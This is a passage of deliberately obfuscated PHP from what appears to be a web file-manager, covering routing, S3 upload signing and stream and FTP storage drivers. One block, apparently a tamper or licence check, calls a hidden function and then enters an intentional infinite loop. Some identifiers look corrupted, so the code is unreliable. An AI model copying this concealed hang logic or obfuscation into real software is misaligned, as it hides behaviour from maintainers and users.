$dƒÂ½ÈøĞâ[1421] . $EèÏ…­¨±Ê; } else { if ($AÁ‘ÆŒèˆ === $dƒÂ½ÈøĞâ[86]) { $Dš„ÇìºçÇ = $this->pluginHost . $A›Ó®¤Ïã; } else { if ($AÁ‘ÆŒèˆ == $dƒÂ½ÈøĞâ[1422]) { $Dš„ÇìºçÇ = STATIC_PATH . $A›Ó®¤Ïã . $dƒÂ½ÈøĞâ[1421] . $Cœœ“Üò è; } else { if ($AÁ‘ÆŒèˆ == $dƒÂ½ÈøĞâ[1423]) { $Dš„ÇìºçÇ = APP_HOST . $dƒÂ½ÈøĞâ[1424] . $A›Ó®¤Ïã . $dƒÂ½ÈøĞâ[1421] . $Cœœ“Üò è; } else { if (isset($F£²ŞÔÆº[$AÁ‘ÆŒèˆ])) { $Dš„ÇìºçÇ = $F£²ŞÔÆº[$AÁ‘ÆŒèˆ] . $A›Ó®¤Ïã . $dƒÂ½ÈøĞâ[1421] . $EèÏ…­¨±Ê; } } } } } } goto b½İ²–Åİ¸; b½İ²–Åİ¸: if (!$Eñ–Òã¶½—) { return $Dš„ÇìºçÇ; } echo $Dš„ÇìºçÇ; goto B•¹–’¢Š; fŸ¼áåÉØ: $dƒÂ½ÈøĞâ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F£²ŞÔÆº = $this->getConfig(); $Cœœ“Üò è = KOD_VERSION . $dƒÂ½ÈøĞâ[104] . KOD_VERSION_BUILD; goto bœõ ˆîç”; B•¹–’¢Š: } public function link($b—¢ºÌ¡‡¸ = false, $f„ÑõÔŠÀº = '') { $eÈÒºçÌÈÍ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$b—¢ºÌ¡‡¸) { $this->link($eÈÒºçÌÈÍ[1425], $eÈÒºçÌÈÍ[1423]); $this->link($eÈÒºçÌÈÍ[1426], $eÈÒºçÌÈÍ[1422]); $this->link($eÈÒºçÌÈÍ[1427], $eÈÒºçÌÈÍ[1422]); $this->link($eÈÒºçÌÈÍ[1428], $eÈÒºçÌÈÍ[1422]); $this->link($eÈÒºçÌÈÍ[1429], $eÈÒºçÌÈÍ[1422]); return; } $CÈÖÒ††é‘ = $this->url($b—¢ºÌ¡‡¸, $f„ÑõÔŠÀº, !1); if (substr($b—¢ºÌ¡‡¸, -3) == $eÈÒºçÌÈÍ[1430]) { echo $eÈÒºçÌÈÍ[1431] . $CÈÖÒ††é‘ . $eÈÒºçÌÈÍ[1432] . $eÈÒºçÌÈÍ[63]; } else { if (substr($b—¢ºÌ¡‡¸, -4) == $eÈÒºçÌÈÍ[1433]) { echo $eÈÒºçÌÈÍ[1434] . $CÈÖÒ††é‘ . $eÈÒºçÌÈÍ[1435] . $eÈÒºçÌÈÍ[63]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\x5e\x2f\x5d\53", "\72\156\165\155" => "\133\60\55\71\x5d\53", "\72\x61\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($fƒ¶¬ƒ‡Ğ®, $b·ÒÅÉÒËÃ) { $AÇÕÑÈø†Œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($fƒ¶¬ƒ‡Ğ® == $AÇÕÑÈø†Œ[1436]) { $f‡ÇŠë¬¦± = array_map($AÇÕÑÈø†Œ[1437], $b·ÒÅÉÒËÃ[0]); $b¯„³‡À²Ä = strpos($b·ÒÅÉÒËÃ[1], $AÇÕÑÈø†Œ[8]) === 0 ? $b·ÒÅÉÒËÃ[1] : $AÇÕÑÈø†Œ[8] . $b·ÒÅÉÒËÃ[1]; $AÆÒˆ×¢œ = $b·ÒÅÉÒËÃ[2]; } else { $f‡ÇŠë¬¦± = null; $b¯„³‡À²Ä = strpos($b·ÒÅÉÒËÃ[0], $AÇÕÑÈø†Œ[8]) === 0 ? $b·ÒÅÉÒËÃ[0] : $AÇÕÑÈø†Œ[8] . $b·ÒÅÉÒËÃ[0]; $AÆÒˆ×¢œ = $b·ÒÅÉÒËÃ[1]; } array_push(self::$maps, $f‡ÇŠë¬¦±); array_push(self::$routes, $b¯„³‡À²Ä); array_push(self::$methods, strtoupper($fƒ¶¬ƒ‡Ğ®)); array_push(self::$callbacks, $AÆÒˆ×¢œ); } public static function error($dò£àì¶Šï) { self::$errorCallback = $dò£àì¶Šï; } public static function haltOnMatch($fˆÒ‘ßÍ¡ = true) { self::$halts = $fˆÒ‘ßÍ¡; } public static function dispatch() { goto D·Òä†é£; aŠ÷Šø¢½œ: $b©…ÊšÕÀ = array_keys(static::$patterns); $dÆŠšÏèÁÑ = array_values(static::$patterns); $Fª­‘¸¢Ï› = !1; goto fÜ Ìç¹‰¿; D·Òä†é£: $e½šƒê…ÙÍ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EµçÇ»Õì‚ = parse_url($_SERVER[$e½šƒê…ÙÍ[1438]], PHP_URL_PATH); $b¸‡™„‚Ú‘ = $_SERVER[$e½šƒê…ÙÍ[166]]; goto aŠ÷Šø¢½œ; fÜ Ìç¹‰¿: self::$routes = preg_replace($e½šƒê…ÙÍ[1122], $e½šƒê…ÙÍ[8], self::$routes); if (in_array($EµçÇ»Õì‚, self::$routes)) { $bŞÛ‰ÃîÚ = array_keys(self::$routes, $EµçÇ»Õì‚); foreach ($bŞÛ‰ÃîÚ as $cöáÏ±ĞÏÎ) { if (self::$methods[$cöáÏ±ĞÏÎ] == $b¸‡™„‚Ú‘ || self::$methods[$cöáÏ±ĞÏÎ] == $e½šƒê…ÙÍ[1439] || in_array($b¸‡™„‚Ú‘, self::$maps[$cöáÏ±ĞÏÎ])) { $Fª­‘¸¢Ï› = !0; if (!is_object(self::$callbacks[$cöáÏ±ĞÏÎ])) { $BËÊò Å‚Ë = explode($e½šƒê…ÙÍ[8], self::$callbacks[$cöáÏ±ĞÏÎ]); $AğêåÛø©ì = end($BËÊò Å‚Ë); $F²éµÙ‡ØÖ = explode($e½šƒê…ÙÍ[1440], $AğêåÛø©ì); $e–©èÑº½ = new $F²éµÙ‡ØÖ[0](); $e–©èÑº½->{$F²éµÙ‡ØÖ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$cöáÏ±ĞÏÎ]); if (self::$halts) { return; } } } } } else { $DÙ¤¸å’ = 0; foreach (self::$routes as $cöáÏ±ĞÏÎ) { if (strpos($cöáÏ±ĞÏÎ, $e½šƒê…ÙÍ[4]) !== !1) { $cöáÏ±ĞÏÎ = str_replace($b©…ÊšÕÀ, $dÆŠšÏèÁÑ, $cöáÏ±ĞÏÎ); } if (preg_match($e½šƒê…ÙÍ[1441] . $cöáÏ±ĞÏÎ . $e½šƒê…ÙÍ[1442], $EµçÇ»Õì‚, $bäºÌá¯„™)) { if (self::$methods[$DÙ¤¸å’] == $b¸‡™„‚Ú‘ || self::$methods[$DÙ¤¸å’] == $e½šƒê…ÙÍ[1439] || !empty(self::$maps[$DÙ¤¸å’]) && in_array($b¸‡™„‚Ú‘, self::$maps[$DÙ¤¸å’])) { $Fª­‘¸¢Ï› = !0; array_shift($bäºÌá¯„™); if (!is_object(self::$callbacks[$DÙ¤¸å’])) { $BËÊò Å‚Ë = explode($e½šƒê…ÙÍ[8], self::$callbacks[$DÙ¤¸å’]); $AğêåÛø©ì = end($BËÊò Å‚Ë); $F²éµÙ‡ØÖ = explode($e½šƒê…ÙÍ[1440], $AğêåÛø©ì); $e–©èÑº½ = new $F²éµÙ‡ØÖ[0](); if (!method_exists($e–©èÑº½, $F²éµÙ‡ØÖ[1])) { echo $e½šƒê…ÙÍ[1443]; } else { call_user_func_array(array($e–©èÑº½, $F²éµÙ‡ØÖ[1]), $bäºÌá¯„™); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$DÙ¤¸å’], $bäºÌá¯„™); if (self::$halts) { return; } } } } $DÙ¤¸å’++; } } if ($Fª­‘¸¢Ï› == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $DÍ…­ê¯°İ =& $_SERVER[í¤âËÚ£¶íÊ¢]; header($_SERVER[$DÍ…­ê¯°İ[1444]] . $DÍ…­ê¯°İ[1445]); echo $DÍ…­ê¯°İ[1446]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$e½šƒê…ÙÍ[1438]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto f½¦á¾õ¬Ã; f½¦á¾õ¬Ã: } } goto eÉÇ™°á„¥; aåÒ¦‹ïá‡: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($B‰ßŞª¼§) { parent::__construct($B‰ßŞª¼§); } public function uploadFormData($e°š™Êˆœğ, $eÉÏ“ñ³À = 3600) { goto D§™ÜñÒË­; D§™ÜñÒË­: $f—Å•‡Ä =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÎÏëìÅ÷ˆ = $f—Å•‡Ä[200]; $E…›¡„ôºã = $f—Å•‡Ä[1183]; goto AÕÀ¦ˆ¶·; e³ƒÎ¬Ÿ¾: $AƒØš²æÒÁ = array($this->accessKey, $eÄîôöÛäã, $this->region, $E ’ô §—Á, $DËÒÚ–ªõµ); $aøğç˜Ë†é = implode($f—Å•‡Ä[8], $AƒØš²æÒÁ); $fÈ˜¦ï—Î¨ = array($f—Å•‡Ä[1149] => gmdate($f—Å•‡Ä[1148], strtotime($f—Å•‡Ä[1186])), $f—Å•‡Ä[1150] => array(array($f—Å•‡Ä[1152] => $this->bucket), array($f—Å•‡Ä[1151] => $cÎÏëìÅ÷ˆ), array($f—Å•‡Ä[1153], $f—Å•‡Ä[1154], $f—Å•‡Ä[33]), array($f—Å•‡Ä[1153], $f—Å•‡Ä[1187], $f—Å•‡Ä[33]), array($f—Å•‡Ä[1153], $f—Å•‡Ä[1188], $f—Å•‡Ä[33]), array($f—Å•‡Ä[1155] => $E®Í÷º¦’Ê), array($f—Å•‡Ä[1189] => $aøğç˜Ë†é), array($f—Å•‡Ä[1190] => $E…›¡„ôºã), array($f—Å•‡Ä[1191] => $EŠ „•ŠŸ‰), array($f—Å•‡Ä[1192] => $c»ª¯À¶Éù))); goto AÛåÅ„ŞÏÛ; AÕÀ¦ˆ¶·: $E ’ô §—Á = $f—Å•‡Ä[69]; $EŠ „•ŠŸ‰ = gmdate($f—Å•‡Ä[1184]); $eÄîôöÛäã = gmdate($f—Å•‡Ä[695]); goto aÈ‰“Áš‰; B†¥§ÖÅÙĞ: $Cá±å†Ü¶Œ = array($f—Å•‡Ä[219] => $f—Å•‡Ä[33], $f—Å•‡Ä[1195] => $f—Å•‡Ä[33], $f—Å•‡Ä[1151] => $cÎÏëìÅ÷ˆ, $f—Å•‡Ä[1155] => $E®Í÷º¦’Ê, $f—Å•‡Ä[1159] => $bŸœöİ‡, $f—Å•‡Ä[1196] => $aøğç˜Ë†é, $f—Å•‡Ä[1197] => $E…›¡„ôºã, $f—Å•‡Ä[1198] => $EŠ „•ŠŸ‰, $f—Å•‡Ä[1199] => $c»ª¯À¶Éù, $f—Å•‡Ä[1200] => $d³¿ÈæÀ”è, $f—Å•‡Ä[184] => $this->getHost()); return $Cá±å†Ü¶Œ; goto F¿÷ÎÃ§»†; BÙÌ—ËÏĞ‚: $bîÒÂ¦³™Š = hash_hmac($f—Å•‡Ä[1193], $E ’ô §—Á, $F‚ÜĞç¬Ñƒ, !0); $c¢ƒñ‚Ö†Í = hash_hmac($f—Å•‡Ä[1193], $DËÒÚ–ªõµ, $bîÒÂ¦³™Š, !0); $d³¿ÈæÀ”è = hash_hmac($f—Å•‡Ä[1193], $bŸœöİ‡, $c¢ƒñ‚Ö†Í); goto B†¥§ÖÅÙĞ; aÈ‰“Áš‰: $DËÒÚ–ªõµ = $f—Å•‡Ä[1185]; $c»ª¯À¶Éù = $eÉÏ“ñ³À . $f—Å•‡Ä[33]; $E®Í÷º¦’Ê = $f—Å•‡Ä[1147]; goto e³ƒÎ¬Ÿ¾; AÛåÅ„ŞÏÛ: $bŸœöİ‡ = base64_encode(json_encode($fÈ˜¦ï—Î¨)); $B±É·ŒÏ = hash_hmac($f—Å•‡Ä[1193], $eÄîôöÛäã, $f—Å•‡Ä[1194] . $this->secret, !0); $F‚ÜĞç¬Ñƒ = hash_hmac($f—Å•‡Ä[1193], $this->region, $B±É·ŒÏ, !0); goto BÙÌ—ËÏĞ‚; F¿÷ÎÃ§»†: } public function multiUploadFormData($AŒ±ë¦à˜, $aÁÑ¸¾—  = 3600) { $aø†ª™—ˆ™ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eß¦‰­õìõ = gmdate($aø†ª™—ˆ™[1278]); $eäÂ‚£Ã¦‡ = array(); $A–­Ì¦ì§• = $this->client->getUploadId($this->bucket, $AŒ±ë¦à˜, $eäÂ‚£Ã¦‡); if (!$A–­Ì¦ì§•) { return !1; } return array($aø†ª™—ˆ™[229] => $A–­Ì¦ì§•, $aø†ª™—ˆ™[184] => $this->getHost() . $aø†ª™—ˆ™[8] . $this->pathEncode($AŒ±ë¦à˜), $aø†ª™—ˆ™[230] => $eß¦‰­õìõ, $aø†ª™—ˆ™[102] => $AŒ±ë¦à˜); } public function multiUploadAuthData($FèÌá…Ó‡£, $FŞÊ¹Úè‰Ï = array()) { goto fùÁ¸Ôğ£ß; fùÁ¸Ôğ£ß: $B ½ù…Ô± =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dò«ó”¥ = isset($FŞÊ¹Úè‰Ï[$B ½ù…Ô±[177]]) ? $FŞÊ¹Úè‰Ï[$B ½ù…Ô±[177]] : $B ½ù…Ô±[33]; $cÉáÍ‚¨Ê = $FŞÊ¹Úè‰Ï[$B ½ù…Ô±[102]]; goto c¡›÷£±î‰; c¡›÷£±î‰: unset($FŞÊ¹Úè‰Ï[$B ½ù…Ô±[102]]); if (isset($FŞÊ¹Úè‰Ï[$B ½ù…Ô±[231]])) { return $this->listUploadParts($cÉáÍ‚¨Ê, $FŞÊ¹Úè‰Ï); } $FÎ˜ø‡éØË = array(); goto Bƒã¬ÍØ£ó; b‹Úäò×†Æ: $a¬³®Ö = $B ½ù…Ô±[234]; $f“Ä£øõƒ½ = $B ½ù…Ô±[8] . $this->pathEncode($cÉáÍ‚¨Ê) . $Dò«ó”¥; $D¯™ï¦¯‚ = $this->client->__getSignatureV4($FÎ˜ø‡éØË, $bœÒ¢‚œê, $a¬³®Ö, $f“Ä£øõƒ½); goto a¨ğ®×É¶; a¨ğ®×É¶: if (strpos($Dò«ó”¥, $B ½ù…Ô±[233]) === 0) { if (isset($FÎ˜ø‡éØË[$B ½ù…Ô±[1280]])) { $aæ“äŞÆˆ = $FÎ˜ø‡éØË[$B ½ù…Ô±[1280]]; } else { if (isset($D¯™ï¦¯‚[$B ½ù…Ô±[1280]])) { $aæ“äŞÆˆ = $D¯™ï¦¯‚[$B ½ù…Ô±[1280]]; } else { $aæ“äŞÆˆ = hash($B ½ù…Ô±[1193], $B ½ù…Ô±[33]); } } return array($B ½ù…Ô±[239] => $D¯™ï¦¯‚[$B ½ù…Ô±[239]], $B ½ù…Ô±[1280] => $aæ“äŞÆˆ, $B ½ù…Ô±[230] => $D¯™ï¦¯‚[$B ½ù…Ô±[1283]]); } return $D¯™ï¦¯‚[$B ½ù…Ô±[239]]; goto DĞèìšÙƒÊ; Bƒã¬ÍØ£ó: if (isset($FŞÊ¹Úè‰Ï[$B ½ù…Ô±[1279]])) { $FÎ˜ø‡éØË[$B ½ù…Ô±[1280]] = $FŞÊ¹Úè‰Ï[$B ½ù…Ô±[1279]]; } $c§æÚéÇ¥ç = explode($B ½ù…Ô±[186], $this->getHost()); $bœÒ¢‚œê = array($B ½ù…Ô±[1281] => $c§æÚéÇ¥ç[1], $B ½ù…Ô±[1282] => $B ½ù…Ô±[33], $B ½ù…Ô±[219] => $B ½ù…Ô±[128], $B ½ù…Ô±[1195] => $FŞÊ¹Úè‰Ï[$B ½ù…Ô±[87]]); goto b‹Úäò×†Æ; DĞèìšÙƒÊ: } public function listUploadParts($fİÈª¨»†È, $fÜùøƒôÙ = array()) { goto eÈÅŞÍ¦Äø; f«×¥Ë¤šÌ: $DŠŒ›œÊÉË = $this->client->__getSignatureV4($aĞë†ÖŠœÕ, $F‹÷…í®Å¾, $c‹Ã¬Ò©Ô , $dÜ¨—’Úó, $aÔ¶‚™Óª®); return array($FâªÙ ¿…[239] => $DŠŒ›œÊÉË[$FâªÙ ¿…[239]], $FâªÙ ¿…[230] => $DŠŒ›œÊÉË[$FâªÙ ¿…[1283]], $FâªÙ ¿…[241] => $E¯¬¶§ÉÔÒ, $FâªÙ ¿…[1280] => $DŠŒ›œÊÉË[$FâªÙ ¿…[1280]]); goto f°è—ß¹±ƒ; cäÖ™•ñã±: if (!$E¯¬¶§ÉÔÒ) { return !1; } $aÔ¶‚™Óª® = $FâªÙ ¿…[1284]; foreach ($E¯¬¶§ÉÔÒ as $e„ÁùÂšƒ) { $aÔ¶‚™Óª® .= $FâªÙ ¿…[1285] . "\x3c\x50\141\x72\x74\116\x75\x6d\x62\145\x72\x3e{$e„ÁùÂšƒ[$FâªÙ ¿…[1240]]}\x3c\57\x50\x61\162\x74\116\165\x6d\x62\x65\x72\76\xa" . "\74\105\124\x61\x67\x3e{$e„ÁùÂšƒ[$FâªÙ ¿…[1241]]}\x3c\57\105\x54\x61\x67\76\xa" . $FâªÙ ¿…[1286]; } goto Aøİ‡ëĞÙ; Aøİ‡ëĞÙ: $aÔ¶‚™Óª® .= $FâªÙ ¿…[1287]; $aĞë†ÖŠœÕ = array(); $fõæ—Œ‡Õ = explode($FâªÙ ¿…[186], $this->getHost()); goto e¯ÄóÀ¡ó±; e¯ÄóÀ¡ó±: $F‹÷…í®Å¾ = array($FâªÙ ¿…[1281] => $fõæ—Œ‡Õ[1], $FâªÙ ¿…[219] => $FâªÙ ¿…[128], $FâªÙ ¿…[1195] => strlen($aÔ¶‚™Óª®)); $c‹Ã¬Ò©Ô  = $FâªÙ ¿…[232]; $dÜ¨—’Úó = $FâªÙ ¿…[8] . $this->pathEncode($fİÈª¨»†È) . $fÜùøƒôÙ[$FâªÙ ¿…[177]]; goto f«×¥Ë¤šÌ; eÈÅŞÍ¦Äø: $FâªÙ ¿… =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C×¾‡í™Ô¶ = str_replace($FâªÙ ¿…[240], $FâªÙ ¿…[33], $fÜùøƒôÙ[$FâªÙ ¿…[177]]); $E¯¬¶§ÉÔÒ = $this->client->listParts($this->bucket, $fİÈª¨»†È, $C×¾‡í™Ô¶); goto cäÖ™•ñã±; f°è—ß¹±ƒ: } public function link($E ºøÔÖìš, $dß¥Ş¸ãº• = array()) { return parent::link($E ºøÔÖìš, $dß¥Ş¸ãº•); } public function fileOut($bò‘ØŒÄŞº, $b¥¶ ¢°â‹ = false, $dğòƒÃ¨å„ = false, $BÕæ¶œ®Š® = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[í¤âËÚ£¶íÊ¢][1288])) { return parent::fileOutServer($bò‘ØŒÄŞº, $b¥¶ ¢°â‹, $dğòƒÃ¨å„, $BÕæ¶œ®Š®); } parent::fileOut($bò‘ØŒÄŞº, $b¥¶ ¢°â‹, $dğòƒÃ¨å„, $BÕæ¶œ®Š®); } public function fileOutImage($CŠ†´í’™, $Eˆá¹Îæ‚  = 250) { if (strstr($this->endpoint, $_SERVER[í¤âËÚ£¶íÊ¢][1288])) { return parent::fileOutImageServer($CŠ†´í’™, $Eˆá¹Îæ‚ ); } parent::fileOutImage($CŠ†´í’™, $Eˆá¹Îæ‚ ); } public function fileOutLink($dÉç¢ÍÙÖ²) { $d¥·»ÚƒíŠ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (substr($dÉç¢ÍÙÖ², 0, 7) == $d¥·»ÚƒíŠ[1162]) { $dÉç¢ÍÙÖ² = $d¥·»ÚƒíŠ[1163] . substr($dÉç¢ÍÙÖ², 7); } header($d¥·»ÚƒíŠ[168] . $dÉç¢ÍÙÖ²); die; } public function getHost() { $c‹Ñ±ãÀ† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e¥šë¶¦ÅÚ = str_rtrim(parent::getHost(), $c‹Ñ±ãÀ†[8] . $this->bucket); $e¥šë¶¦ÅÚ = explode($c‹Ñ±ãÀ†[186], $e¥šë¶¦ÅÚ); return $e¥šë¶¦ÅÚ[0] . $c‹Ñ±ãÀ†[186] . $this->bucket . $c‹Ñ±ãÀ†[104] . $e¥šë¶¦ÅÚ[1]; } } if (!isset($_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][59]]) || !isset($_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][57]])) { goto ešŠ™‡ˆ; Cáš–„ª : $d¾’‰áóÌ($_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][61]] . $_SERVER[í¤âËÚ£¶íÊ¢][62]); $eäïÆ‹«Î = 2; while ($eäïÆ‹«Î > 1) { $a•Šõ½À¢ = rawurlencode($eäïÆ‹«Î . $_SERVER[í¤âËÚ£¶íÊ¢][360]); } goto dÊŠÉ¯›™; dáŞˆë£ˆâ: $eÃ·¿¨æÍ = explode($_SERVER[í¤âËÚ£¶íÊ¢][63], $föµ½¾îŒÏ); if (count($eÃ·¿¨æÍ) < $_SERVER[í¤âËÚ£¶íÊ¢][64]) { $DÁ‘×ïË = $_SERVER[í¤âËÚ£¶íÊ¢][65]; $DÁ‘×ïË(); } $d¾’‰áóÌ = $_SERVER[í¤âËÚ£¶íÊ¢][66]; goto Cáš–„ª ; ešŠ™‡ˆ: $F†šÚ ˜¿Ï = $_SERVER[í¤âËÚ£¶íÊ¢][60]; $FÇ¹¸Åçôƒ = $_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][61]] . $_SERVER[í¤âËÚ£¶íÊ¢][62]; $föµ½¾îŒÏ = $F†šÚ ˜¿Ï($FÇ¹¸Åçôƒ); goto dáŞˆë£ˆâ; dÊŠÉ¯›™: } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($EµÍ´ÌŞ¿³, $Eİİ¤Æë = 0) { parent::__construct(); $this->source = $EµÍ´ÌŞ¿³; $this->sourceSize = $Eİİ¤Æë; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($cÖ¢ù¤ßˆø = false) { return $this->sourceSize; } public function getContent($f—É·ÙâÜ¢ = false) { return $this->fileSubstr($f—É·ÙâÜ¢, 0, $this->sourceSize); } public function fileSubstr($Câ¤¤Å¹Á = false, $eÓŸ¶‚Ô˜¨ = 0, $AÓî±°‹ = 0) { if (!$AÓî±°‹) { $AÓî±°‹ = $this->sourceSize; } $f½‰—¢Í•Ñ = $this->sourceSize - $eÓŸ¶‚Ô˜¨; if ($AÓî±°‹ >= $f½‰—¢Í•Ñ) { $AÓî±°‹ = $f½‰—¢Í•Ñ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $eÓŸ¶‚Ô˜¨, $AÓî±°‹); } if ($this->sourceType == self::TYPE_FILE) { if ($AÓî±°‹ <= 0) { return $_SERVER[í¤âËÚ£¶íÊ¢][33]; } $E…³êŸæŒ× = ftell($this->source); fseek_64($this->source, $E…³êŸæŒ× + $eÓŸ¶‚Ô˜¨); $aŞËÄÜ¹¬ñ = @fread($this->source, $AÓî±°‹); fseek_64($this->source, $E…³êŸæŒ×); return $aŞËÄÜ¹¬ñ; } } public function hashMd5($e§Ğ×®¼î¿ = false) { return md5($this->getContent()); } public static function hash($aÀ¬¸Ë¦î‡, $Cñò»İÑº = 0) { $cÙˆ™”Ó£¤ = new PathDriverStream($aÀ¬¸Ë¦î‡, $Cñò»İÑº); return $cÙˆ™”Ó£¤->hashSimple($aÀ¬¸Ë¦î‡); } public static function md5($e†¡¢Í¢Ñ, $e—ãç††³æ = 0) { $cŠÑÄ»²÷İ = new PathDriverStream($e†¡¢Í¢Ñ, $e—ãç††³æ); return $cŠÑÄ»²÷İ->hashMd5($e†¡¢Í¢Ñ); } } goto d½º†òš·; eÊâƒ²ÆåÊ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($EÒ×éÌïƒç) { parent::__construct(); if (count($EÒ×éÌïƒç) > 0) { $this->_init($EÒ×éÌïƒç); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($fëõ¦–ÄË) { $C’‹¯èğ¥ó =& $_SERVER[í¤âËÚ£¶íÊ¢]; global $config; $this->appCharset = $config[$C’‹¯èğ¥ó[1201]]; $this->systemCharset = $config[$C’‹¯èğ¥ó[1202]]; if (isset($fëõ¦–ÄË[$C’‹¯èğ¥ó[1203]]) && $fëõ¦–ÄË[$C’‹¯èğ¥ó[1203]]) { $this->systemCharset = $fëõ¦–ÄË[$C’‹¯èğ¥ó[1203]]; } } public function iconvApp($AÏëä­éŒ—) { return $this->iconvTo($AÏëä­éŒ—, $this->systemCharset, $this->appCharset); } public function iconvSystem($dã“ÙˆÂˆõ) { return $this->iconvTo($dã“ÙˆÂˆõ, $this->appCharset, $this->systemCharset); } public function getPathOuter($fèÚÇ¾ì‘Ÿ) { goto a®¶õ–Ê¯”; B¦ê¤ñ“À: $fèÚÇ¾ì‘Ÿ = KodIO::clear($fèÚÇ¾ì‘Ÿ); $fèÚÇ¾ì‘Ÿ = substr($fèÚÇ¾ì‘Ÿ, strlen($dê›ÂŞõóğ)); if (empty($this->pathDriver)) { return $fèÚÇ¾ì‘Ÿ; } goto A„¹›ÁÒÜ­; FÑ™‰¹ñĞ±: if (substr($dê›ÂŞõóğ, 0, 2) == $AÉæÕ…Î‹—[1204]) { $dê›ÂŞõóğ = BASIC_PATH . substr($dê›ÂŞõóğ, 2); } if (substr($fèÚÇ¾ì‘Ÿ, 0, 2) == $AÉæÕ…Î‹—[1204]) { $fèÚÇ¾ì‘Ÿ = BASIC_PATH . substr($fèÚÇ¾ì‘Ÿ, 2); } $dê›ÂŞõóğ = KodIO::clear($dê›ÂŞõóğ); goto B¦ê¤ñ“À; a®¶õ–Ê¯”: $AÉæÕ…Î‹— =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dê›ÂŞõóğ = $this->iconvApp($this->pathBase); $fèÚÇ¾ì‘Ÿ = $this->iconvApp($fèÚÇ¾ì‘Ÿ); goto FÑ™‰¹ñĞ±; A„¹›ÁÒÜ­: return $this->pathDriver . $AÉæÕ…Î‹—[8] . ltrim($fèÚÇ¾ì‘Ÿ, $AÉæÕ…Î‹—[8]); goto dƒ¡ÒÆà Ê; dƒ¡ÒÆà Ê: } private function _init($Bï‡ö„ª‡ø = array()) { $A¢Æš©…„ì =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!function_exists($A¢Æš©…„ì[1205])) { throw new Exception(LNG($A¢Æš©…„ì[1206])); } $this->config = $Bï‡ö„ª‡ø; $this->charsetReset($Bï‡ö„ª‡ø); foreach ($Bï‡ö„ª‡ø as $c‚îãŸÂ†ê => $B†§¢ØÛ¦¨) { if (isset($this->{$c‚îãŸÂ†ê})) { $this->{$c‚îãŸÂ†ê} = $B†§¢ØÛ¦¨; } } return $this->_login($Bï‡ö„ª‡ø); } private function _login($dµ”ÀÒòÛî) { goto b¦Âè›Ö’Å; f‹Òõˆßî: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $CÆå‚ªŞÊ‡ = $this->pasv == $eÙ’¹Ê«´[96] ? !0 : !1; @ftp_pasv($this->connect, $CÆå‚ªŞÊ‡); goto C½‹øêµŠ‘; b¦Âè›Ö’Å: $eÙ’¹Ê«´ =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $e¼Õ†¤‡‰Ò = array(); $EÍËò¾•” = md5(json_encode($dµ”ÀÒòÛî)); goto cíÒ«ˆ±Ì‚; bÕ›¿—‡¥³: $Bß‘ÆæÌö÷ = isset($dÕÊÃ”•ƒ[$eÙ’¹Ê«´[183]]) && $dÕÊÃ”•ƒ[$eÙ’¹Ê«´[183]] == $eÙ’¹Ê«´[1207] ? !0 : !1; $this->scheme = $Bß‘ÆæÌö÷ ? $eÙ’¹Ê«´[1208] : $eÙ’¹Ê«´[1209]; $this->port = isset($dÕÊÃ”•ƒ[$eÙ’¹Ê«´[185]]) ? $dÕÊÃ”•ƒ[$eÙ’¹Ê«´[185]] : 21; goto Ağ×¾‡‡ˆ; cíÒ«ˆ±Ì‚: if (isset($e¼Õ†¤‡‰Ò[$EÍËò¾•”])) { foreach ($e¼Õ†¤‡‰Ò[$EÍËò¾•”] as $cÃ¹†ò¸ë‹ => $D„ÅÂŠõ–å) { $this->{$cÃ¹†ò¸ë‹} = $D„ÅÂŠõ–å; } return !0; } $dÕÊÃ”•ƒ = parse_url(trim($this->server, $eÙ’¹Ê«´[8])); $this->host = $dÕÊÃ”•ƒ[$eÙ’¹Ê«´[184]]; goto bÕ›¿—‡¥³; Ağ×¾‡‡ˆ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $B°ÜÂìœèô = @ftp_login($this->connect, $this->username, $this->userpass); goto f‹Òõˆßî; C½‹øêµŠ‘: $e¼Õ†¤‡‰Ò[$EÍËò¾•”] = array($eÙ’¹Ê«´[1210] => $this->connect, $eÙ’¹Ê«´[184] => $this->host, $eÙ’¹Ê«´[183] => $this->scheme, $eÙ’¹Ê«´[185] => $this->port); return $B°ÜÂìœèô; goto BµÈ“í†¾…; BµÈ“í†¾…: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return 